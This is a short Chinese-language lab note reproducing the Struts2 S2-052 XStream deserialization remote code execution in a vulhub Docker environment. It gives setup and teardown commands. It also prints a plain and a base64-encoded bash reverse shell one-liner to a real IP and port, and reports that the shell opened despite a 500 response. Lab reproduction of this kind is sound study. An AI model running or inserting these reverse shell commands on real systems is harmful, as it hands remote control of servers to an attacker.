ailx10说：这篇是我2024年9月写的。刷了不少 OGNL 后，S2-052 算是换了条路。这次入口是 REST 插件处理 XML，重点变成 XStream 如何把内容还原成对象，以及对象链怎样一路走到进程执行。我先看文件有没有创建，再试连接，哪怕页面返回 500，也继续检查服务端的实际动作。笔记里因此保留了对象和请求的样子，方便与前面的表达式实验对照。不能因为它也挂着 S2 编号，就把所有 Struts2 问题都归成同一种机制。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Struts2 S2-052 远程代码执行漏洞 环境搭建成功了

（2）反弹shell

```
bash -i >& /dev/tcp/144.34.162.13/6666 0>&1
```

使用Base64编码版本

```
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMTYyLjEzLzY2NjYgMD4mMQ==} |{base64,-d}|{bash,-i}
```

同理，使用Burp重放，尽管响应码500，但是依然反弹shell成功了

![](/notes-assets/48c05af1151e8640e01f.webp)

![](/notes-assets/a349d464820bbd57e5bf.webp)

500和文件变化同时出现，是这篇很重要的对照。响应状态只讲了接口最后怎样结束，不能单独替请求过程中已经发生的行为作结论。
